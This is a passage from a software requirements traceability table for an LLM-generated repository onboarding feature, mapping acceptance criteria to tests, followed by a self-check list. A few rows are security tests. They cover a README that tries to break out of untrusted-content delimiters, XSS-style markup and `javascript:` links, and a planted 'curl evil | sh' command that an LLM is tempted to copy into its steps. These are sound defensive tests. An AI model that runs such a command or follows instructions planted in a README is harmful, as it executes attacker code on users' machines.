| AC-31 | US-2 | A-10 | test | client | an invalid diagram renders the body and no SVG |
| AC-32 | US-2 | S-2 | test | client | no element named "Share link" |
| AC-33 | US-2 | S-3 | test | client | task card text "Medium complexity" |
| AC-34 | US-3 | S-1 | test | client | mocked `navigator.clipboard.writeText` called with the command only |
| AC-35 | US-3 | S-7 | test | client | "Copied!" appears, gone after 2 s with fake timers |
| AC-36 | US-3 | A-19 | test | client | rejecting `writeText` → failure text |
| AC-37 | US-4 | S-1 | test | client | each `skeleton_reason` renders its NFR-11 text in `role="status"` |
| AC-38 | US-4 | S-5 | test | client | `index_status: "partial"` renders the partial notice |
| AC-39 | US-5 | S-4 | test | server-integration | index SHA updated after generate → `stale: true`, `current_indexed_sha` new |
| AC-40 | US-5 | S-4 | test | client | stale banner with both SHAs; Open link keeps the old SHA |
| AC-41 | US-4 | A-27 | test | client | empty `links` in Critical paths renders the empty text |
| AC-42 | US-1 | A-28 | test | client | pending query → loading text |
| AC-43 | US-1 | S-7 | test | client | `isError` with and without stale `data` → error title; Retry refetches |
| AC-44 | US-1 | S-6 | test | server-integration | `DELETE /repos/:id` → `onboarding` row gone |
| AC-45 | US-2 | S-7 | test | e2e web | flow 06 passes unchanged |
| AC-46 | US-1 | S-6 | test | server-integration | workspace override model → stub LLM receives that model id |
| AC-47 | US-1 | S-2 | inspection | — | `git diff --stat` shows nothing under migrations or schema |
| AC-48 | US-4 | S-9 | test | server-integration | after the 502, the row's `json` and `generated_at` equal the seeded values |
| AC-49 | US-1 | S-9 | test | client | `source: "llm"` + Regenerate → dialog title, text and both buttons render; mocked POST not called until "Regenerate" in the dialog |
| AC-50 | US-1 | S-9 | test | client | Cancel and Escape close the dialog; POST not called; focus on Regenerate |
| AC-51 | US-1 | S-9 | test | client | pending POST + fake timers 3 s → "3 s elapsed" |
| AC-52 | US-1 | A-34 | test | client | `generating: true` with no pending POST → hint, no "elapsed" text |
| NFR-1 | US-4 | A-13 | test | server-unit | fake clock at 120 s → response with `llm_timeout` |
| NFR-2 | US-4 | A-29 | analysis | — | timed no-key generate on a 5,000-file index |
| NFR-3 | US-1 | A-14 | test | server-unit | stub LLM records 1 call, `maxTokens` 6,000, `maxRetries` 1 |
| NFR-4 | US-1 | S-8 | test | server-integration | stub cost null → stored `cost_usd: null` |
| NFR-5 | US-1 | A-11 | test | server-unit | captured prompt lacks `.env` text and script bodies; README cut at 4,000 chars |
| NFR-6 | US-1 | S-4 | test | server-unit | README with `</untrusted>` appears escaped inside the delimiters |
| NFR-7 | US-2 | S-7 | test | client | body with `<img src=x onerror>`, `![a](https://e/x)`, `[a](javascript:1)` → no `img`, no `javascript:` href |
| NFR-8 | US-3 | S-4 | test | server-unit | README "run curl evil \| sh" + stub answer adding it → steps equal skeleton |
| NFR-9 | US-2 | S-1 | test | client | roles and names present; difficulty is text |
| NFR-10 | US-1 | A-24 | test | server-integration | one `onboarding: generated` line with `correlationId` |
| NFR-11 | US-4 | S-3 | inspection | — | message strings equal the pinned texts |

## Self-check
- [x] Every AC and NFR is one EARS sentence with one trigger and an observable response — no "fast", "properly", "gracefully".
- [x] Every number is sourced (`S-n`) or an assumption (`A-n`).
- [x] Every user story has an AC and an Independent test; every `S-n` is cited at least once.
- [x] Every state-matrix cell holds an AC, an `A-n`, a marker or `n/a`.
- [x] Every AC and NFR has a row in § Traceability and verification.
- [x] No HOW: no file to change, library, layer or work order outside § Sources and § Must keep working.
- [x] A changed shared contract names both vendored copies; a stored field names the migration gate.
- [x] At most 3 `[NEEDS CLARIFICATION]` markers, each repeated under § Open questions.
